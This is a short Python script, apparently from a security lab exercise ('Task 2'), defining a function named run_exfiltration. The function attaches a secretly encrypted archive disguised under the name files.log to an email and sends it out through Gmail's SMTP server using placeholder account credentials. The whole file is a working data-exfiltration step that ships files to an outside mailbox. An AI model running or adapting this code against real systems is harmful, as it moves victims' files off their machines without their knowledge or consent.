import email
import smtplib
import os
from email.message import EmailMessage

def run_exfiltration():

#Configuration

    sender_email = "your_email@gmail.com"
    receiver_email = "receiver_email@gmail.com"
    app_password = "your_app_password_here" #Generarted from Google account

    #Creating the email
    msg = EmailMessage()
    msg["Subject"] = "Exfiltrated Encrypted Files"
    msg["From"] = sender_email
    msg["To"] = receiver_email 
    msg.set_content("Attached will be the encrypted files from Task 2")

    #Attaching Files
    #Attach files.log (the seceretly encrypted zip file)
    if os.path.exists("files.log"):
        with open("files.log", "rb") as f:
            file_data = f.read()
            msg.add_attachment(file_data, maintype="application", subtype="octet-stream", filename="files.log")
            print("Attached: files.log")


    #Sending the email
    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(sender_email, app_password)
            smtp.send_message(msg)
            print("\nEmail sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")


